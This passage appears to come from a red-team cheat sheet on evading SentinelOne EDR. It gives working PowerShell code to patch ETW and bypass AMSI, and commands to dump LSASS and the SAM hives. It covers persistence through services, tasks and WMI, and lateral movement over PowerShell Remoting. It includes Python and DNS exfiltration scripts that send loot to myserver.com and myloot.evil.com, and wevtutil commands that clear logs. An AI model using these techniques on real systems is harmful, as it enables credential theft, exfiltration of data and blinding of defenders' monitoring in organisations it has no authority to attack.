•	PowerShell Alternative: Instead of doing the above in C/C++, you can use a PowerShell script with reflective DLL loading to achieve unhooking. For instance, Invoke-ReflectivePEInjection could load a fresh ntdll.dll into memory and compare function byte patterns to identify hooks, then patch them. There are published PowerShell scripts for EDR unhooking; just be sure to heavily obfuscate them to avoid static detection.

•	Disable ETW (Optional but Recommended): As mentioned in Threat Hunting Evasion, patching ETW functions can prevent SentinelOne from receiving telemetry. For example, in PowerShell you could do something like:
```
$Etw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
          ( [IntPtr] (Get-ProcAddress (Get-ModuleHandle 'ntdll'), 'EtwEventWrite') ),
          (Get-Type 'System.Int32') )
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
[System.Runtime.InteropServices.Marshal]::Copy((,[byte]0xC3), 0, $mem, 1)  # 0xC3 = RET instruction
$oldProt = [ref]0
VirtualProtect($Etw.Method.MethodHandle.GetFunctionPointer(), 1, 0x40, $oldProt) | Out-Null
[System.Runtime.InteropServices.Marshal]::Copy($mem, 0, $Etw.Method.MethodHandle.GetFunctionPointer(), 1)
```
(The above uses a lot of .NET interop; ensure the pointers and types are correct. Alternatively, use a C# implant to patch EtwEventWrite via P/Invoke, as shown in the C example earlier.)
•	Bypass AMSI for Script Execution: If you plan to run any scripts (PowerShell, VBScript, etc.) that might trigger AMSI, disable AMSI first. In PowerShell one-liner form:
```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')::amsiInitFailed = $true
```
This sets the internal AMSI flag to indicate “AMS scanning not needed.” Alternatively, patch the AmsiScanBuffer function in memory to always return 0 (success). There are many public one-liners and small scripts to do this.

•	At this point, your implant/process is running with a significantly reduced chance of being detected by SentinelOne’s user-mode components. Hooks are removed, ETW events are blocked, and script AMSI is bypassed. Proceed quickly to the next steps while you have this advantage, and minimize further use of noisy scripting if possible (transition to your compiled implants or in-memory agents).

4. Post-Exploitation Actions (While EDR is Blinded)
   
•	Privilege Escalation: Now perform your privilege escalation, if needed. Since you’ve unhooked and disabled some monitoring, you can attempt standard techniques such as:
o	Token impersonation: Use OpenProcessToken (via direct syscall or API if unhooked) to steal a token from a SYSTEM process, then ImpersonateLoggedOnUser to become SYSTEM.
o	Launch an elevated process: Use CreateProcessWithLogonW or schedule a task (schtasks.exe /RUN) to run a process as an Administrator or SYSTEM. (SentinelOne will see schtasks or a new process, but if it looks like an admin doing normal work, it may not alert.)
o	Local Exploit: If you have a local privilege escalation exploit (for Windows or a third-party app), run it now – it’s less likely to be caught with hooks removed. Once you are SYSTEM, you can double down on disabling SentinelOne entirely if needed (e.g., terminate its processes via NtTerminateProcess syscall, or deploy your BYOVD at this stage). Often, though, unhooking is enough to safely dump credentials and proceed without fully killing the agent.

•	Credential Access: Dump credentials from the system:
o	Dump LSASS memory for user passwords/hashes. As noted, prefer a living-off-the-land approach: for example, run:
```
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full
```
This uses Microsoft’s own MiniDump function to create a dump of LSASS. If your unhooking succeeded, SentinelOne likely will not prevent this. Be sure to do this as SYSTEM and immediately secure the dump file (encrypt it or move it to a non-obvious location).

o	Alternatively, use a custom dumping tool that performs direct syscalls (e.g. Nanodump open-source tool, which is designed to evade EDR hooks). Run it now to get creds.
o	Dump the SAM/SECURITY registry hives (for local account hashes) using reg save commands – this is usually below the EDR’s radar, especially if done using built-in reg.exe.
o	Once you have credential material, consider clearing or encrypting any files generated. Do not leave lsass.dmp lying on disk in plaintext.

•	Persistence Setup: Establish persistence carefully now that you have elevated rights:
o	You could create a new service that launches your implant at boot. If so, disguise it well (e.g., copy an existing legit service binary and tweak it to load your code, use a plausible name and description). Use sc create or PowerShell New-Service. Keep in mind SentinelOne might flag the creation of an unknown service, so weigh the risk.

o	Alternatively, schedule a task to run at user logon or system startup that executes your payload (perhaps a benign-looking script that injects your beacon). Schtasks /create can do this.
o	For minimal new footprint, consider WMI Event Subscription: using PowerShell’s Set-WmiInstance, you can register an event filter and consumer in WMI that triggers your code on some event (like at 1 AM or on next login). This persistence resides in WMI repository (invisible on disk to typical scans) and can run with SYSTEM privileges.
o	Whichever method, test that it works (if you can afford to, simulate a reboot or just manually trigger it).
o	Once persistence is in place, you can afford to lose your current interactive session because you have a way back in.

•	Lateral Movement (with OPSEC): Using the credentials obtained, move to other hosts:
o	If possible, use living-off-the-land methods here too. For example, use WMI Exec or WinRM (PowerShell Remoting) to execute your payload on remote hosts. Since you have a fileless or memory-only approach, you can remotely inject a payload via PowerShell Remoting:
```
Invoke-Command -ComputerName TARGET -ScriptBlock {
   # Inside remote session: re-do some evasion (disable AMSI, etc.)
   # ... then reflectively load beacon or run shellcode ...
}
```
Make sure to again disable AMSI/ETW on the remote side before injecting your payload.
o	Or use a PsExec-style method (create a remote service that runs your code). If you do this, consider using Impacket’s psexec.py or similar, which can operate purely in memory on the target.
o	If RDP is available and you have credentials, you could RDP to a machine and operate through the GUI (though SentinelOne is still on those machines, so you’d need to apply similar evasion there).
o	For each new host compromised, repeat the essential steps: unhook in that process, patch ETW, then proceed with post-ex actions. You can script/automate this by bundling the evasion steps into the payload that you deploy on each host (e.g., have your beacon run an unhooking routine as soon as it starts on a new host).

o	In some cases, prior to lateral movement you might choose to deploy a small script or tool to disable SentinelOne on the target (if you have admin creds and know the procedure to unload the agent), then proceed with malware deployment. This carries risk but ensures the target won’t block your payload.

•	Data Collection & Exfiltration: Quietly gather target data and exfiltrate (if that’s within scope):
o	Use native tools to collect files (e.g. robocopy to copy directories) but do it slowly and maybe throttle CPU usage to avoid making SentinelOne suspicious about a process suddenly reading hundreds of files.

o	Stage collected data in an encrypted archive as discussed in Section 7 (e.g., create a password-protected 7z or use openssl to encrypt data).
o	Exfiltrate via your chosen stealth channel (DNS, HTTPS, etc.). For instance, you could use a Python snippet on the host (or via your C2) to chunk and send data over HTTP GET requests:
```
import base64, requests
data = open("loot.zip","rb").read()
blob = base64.b64encode(data).decode()
# split blob into manageable chunks
chunks = [blob[i:i+500] for i in range(0, len(blob), 500)]
for part in chunks:
    requests.get("https://myserver.com/exfil", params={"data": part})
```
On your server side, you’d reassemble the base64 parts. This HTTP pattern looks like normal web API traffic but is slowly leaking data.
o	Alternatively, if feasible, upload data to an approved cloud service (OneDrive, Dropbox, Google Drive) using their APIs or CLI tools – this often flies under the radar entirely because it appears as normal user behavior.

•	Covering Tracks: Before wrapping up on a host:
o	Delete any dumped files or archives you created (using secure deletion if possible). At least do a normal delete, then consider wiping free space or overwriting the file to prevent easy recovery.
o	Clear command history: if you used an interactive PowerShell session, clear the PowerShell history (Remove-Item (Get-PSReadLineOption).HistorySavePath). If on Linux (for whatever reason), clear .bash_history.
o	Clear Windows Event Logs that contain your activity, if feasible. For example:
```
wevtutil clear-log Security
```
```
wevtutil clear-log Microsoft-Windows-PowerShell/Operational
```
Be aware that clearing logs can itself generate an event or alert (and missing logs may raise suspicion). Use your judgment – sometimes it’s better to leave benign-looking logs in place.
o	Remove any persistence mechanisms you set if the engagement is ending (or if not needed anymore). That means deleting any created user accounts, services, scheduled tasks, registry keys, WMI subscriptions, etc., that you added. The goal is to leave as little trace as possible for the client or an IR team to find later, unless you’ve arranged to leave certain artifacts for learning purposes.
o	If you only disabled SentinelOne in memory (unhooked, etc.) but didn’t actually kill it, you might optionally restore what you patched. For example, re-hook ntdll by restoring the original hooked bytes (if you saved them) before you exit. If you did kill or uninstall the agent, there’s not much to do on that host – in a real scenario, an admin will notice an agent not reporting; in a red team, you might coordinate with the client to reinstall the agent after the engagement.

o	Ensure any backdoors or implants are either removed or properly communicated to the client for post-engagement cleanup.
•	Extraction: If all goals are achieved, carefully disconnect and remove any persistent access. Make sure no beacon or tool is left running that could be discovered later. Essentially, execute your exfiltration plan and then get out cleanly.
Code Snippets Quick Reference:
•	Direct Syscall (C): See the example in Section 2 for using the syscall instruction to bypass user-land API hooks.
•	API Unhook (C++): See the snippet under Userland EDR Evasion Steps for patching ntdll functions in memory to remove EDR hooks.
•	Disable ETW (C/PowerShell): Patch EtwEventWrite to immediately return (thus preventing ETW events from being sent). Refer to the code in Threat Hunting Evasion above for an example in C.
•	PowerShell AMSI Bypass: Use the one-liner:
```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')::amsiInitFailed = $true
```
to disable AMSI in the current PowerShell session.
•	LSASS Dump via COM: Use the Microsoft-supported method:
```
rundll32.exe comsvcs.dll, MiniDump <LSASS_PID> dump.bin full
```
(then compress & encrypt dump.bin for safety).
•	DNS Exfil (PowerShell): Split data and exfiltrate via DNS queries:
```
$data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Content C:\loot\passwords.txt)))
$chunks = $data -split '.{50}'
foreach($chunk in $chunks){ nslookup "$chunk.myloot.evil.com" 8.8.8.8 }
```
This sends chunks of the file via DNS queries (using 8.8.8.8 as an external DNS server). On your DNS server, reconstruct the data from the query logs.

Keep this cheat sheet as a handy guide, but always adapt to the specifics of the target environment. Combine these techniques as needed, test them in a lab with SentinelOne if possible, and remain flexible – EDR bypass is not one-size-fits-all. Good hunting!
